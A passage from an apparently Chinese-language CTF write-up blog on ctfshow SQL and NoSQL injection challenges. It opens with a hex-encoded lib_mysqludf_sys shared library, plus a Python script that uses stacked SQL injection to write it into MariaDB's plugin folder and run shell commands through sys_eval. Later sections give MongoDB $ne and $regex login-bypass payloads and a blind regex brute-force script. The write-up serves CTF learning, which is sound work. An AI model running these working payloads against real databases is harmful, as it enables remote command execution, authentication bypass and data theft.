FF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#x27;</span></span><br><span class="line">codes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(code), <span class="number">128</span>):</span><br><span class="line">    codes.append(code[i:<span class="built_in">min</span>(i + <span class="number">128</span>, <span class="built_in">len</span>(code))])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建临时表</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空临时表</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入第一段数据</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[<span class="number">0</span>])</span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新连接剩余数据</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(codes)):</span><br><span class="line">    sql = <span class="string">&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[k])</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">    requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.3.18-MariaDB</span></span><br><span class="line"><span class="comment"># 写入so文件</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so\&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 引入自定义函数</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;udf.so\&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行，结果更新到界面</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;cat /flag.her?&#x27;))&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看结果</span></span><br><span class="line">r = requests.get(url[:-<span class="number">4</span>] + <span class="string">&#x27;?page=1&amp;limit=10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><p><code>$user = $memcache-&gt;get($id);</code>使用 Memcache 类的 get 方法从缓存中获取数据，$id 是传入的键，用于从缓存中获取与该键对应的值，当 <code>get()</code> 接收到一个数组时，它会尝试获取数组中所有元素对应的键。使用数组绕过</p>
<p><code>?id[]=flag</code></p>
<h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><p><code>$regex</code> 是用于正则表达式匹配的操作符。</p>
<ul>
<li><code>$regex</code> 允许使用正则表达式进行模式匹配</li>
<li>语法：<code>&#123; 字段: &#123; $regex: 模式 &#125; &#125;</code></li>
</ul>
<p><code>$ne</code> 是 MongoDB 和其他 NoSQL 数据库中的”不等于”(not equal)操作符。</p>
<ul>
<li><code>$ne</code> 用于查找字段值不等于指定值的文档</li>
<li>语法：<code>&#123; 字段: &#123; $ne: 值 &#125; &#125;</code></li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>bea56c10-9388-468e-9496-d42a8a42cdb1.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;135&quot;, &quot;Not-A.Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;135&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://bea56c10-9388-468e-9496-d42a8a42cdb1.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://bea56c10-9388-468e-9496-d42a8a42cdb1.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-gams">username[<span class="symbol">$</span><span class="keyword">ne</span>]=<span class="number">1</span>&amp;password[<span class="symbol">$</span><span class="keyword">ne</span>]=<span class="number">1</span></span></span><br></pre></td></tr></table></figure>

<h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><p><code>username=admin&amp;password[$ne]=anything</code>得到回显并不是flag，<code>username[$ne]=admin&amp;password[$ne]=anything</code>得到flag</p>
<h2 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]=^[^admin].*$&amp;password[$ne]=1</span><br><span class="line">username[$ne]=1&amp;password[$regex]=ctfshow&#123;</span><br><span class="line">username[$regex]=f_l_a_g&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<p><code>[^admin]</code>是一个字符类的否定，表示匹配所有匹配任何<strong>不在</strong>括号内的字符，所以<code>^[^admin]</code>是匹配所有<strong>首字符不是</strong><code>a\d\m\i\n</code>的用户名。</p>
<h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><p>正则遍历进行盲注，但是有个问题，我如果直接遍历的话容易给我搞到admin，所以我加了一个f，并且正则问题</p>
<p><code>f&#39;^f&#123;temp_target&#125;.*$&#39;</code>只匹配<code>f</code>开头的字符串，<code>f&#39;f&#123;temp_target&#125;.*$&#39;</code>匹配<code>f</code>在字符串任意位置的字符串，那为什么不能用第一种呢，因为我使用了另一个payload，<code>f&#39;^[^admin]&#123;temp_target&#125;.*$&#39;</code>，来测试发现其实username的正则应该是<code>ql_flag</code>，MongoDB中的正则表达式默认是<strong>子字符串匹配</strong>的，就是说只要有那个关键词的字符串都可以匹配，所以网上大家写的脚本即使只有<code>flag</code>也可以正常运行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">table = string.digits+string.ascii_lowercase+string.ascii_uppercase+<span class="string">&#x27;_&#123;&#125;-,&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://8d9e641e-652a-4212-8690-201e1a4fcd01.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">        temp_target = target+j</span><br><span class="line">        payload1 = <span class="string">f&#x27;^[^admin]<span class="subst">&#123;temp_target&#125;</span>.*$&#x27;</span></span><br><span class="line">        <span class="comment"># payload1 = f&#x27;f&#123;temp_target&#125;.*$&#x27;</span></span><br><span class="line">        data1 = &#123;<span class="string">&#x27;username[$regex]&#x27;</span>:payload1</span><br><span class="line">                ,<span class="string">&#x27;password[$ne]&#x27;</span>:<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">        payload2 = <span class="string">f&#x27;^<span class="subst">&#123;temp_target&#125;</span>.*$&#x27;</span></span><br><span class="line">        data2 = &#123;<span class="string">&#x27;username[$regex]&#x27;</span>:<span class="string">&#x27;^[^admin]ql_flag&#x27;</span></span><br><span class="line">                 ,<span class="string">&#x27;password[$regex]&#x27;</span>:payload2&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(payload2)</span></span><br><span class="line">        r = requests.post(url=url, data=data2).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u767b\u9646\u6210\u529f&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            target += j</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>起初是因为疑难解答群最近挺多师傅问这些题目，但是回头发现自己也不是特别熟悉，就拿三天时间慢慢的做了做，发现还是挺有意思的，之前不甚懂的，现在基本随便看看就知道，就当复习了一下</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechat.png" alt="baozongwi reward">
        <span>reward</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>baozongwi
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://baozongwi.xyz/posts/cd23a76c.html" title="ctfshowSql注入">https://baozongwi.xyz/posts/cd23a76c.html</a>
  </li>
  <li class="post-copyright-license">
      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/mysql/" rel="tag"># mysql</a>
              <a href="/tags/%E5%A7%BF%E5%8A%BF/" rel="tag"># 姿势</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/50969f65.html" rel="prev" title="ACTF2025(webAK)">
                  <i class="fa fa-angle-left"></i> ACTF2025(webAK)
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/f56f86a2.html" rel="next" title="DevSecOpsCTF2025">
                  DevSecOpsCTF2025 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">baozongwi</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">3.1m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">87:21</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
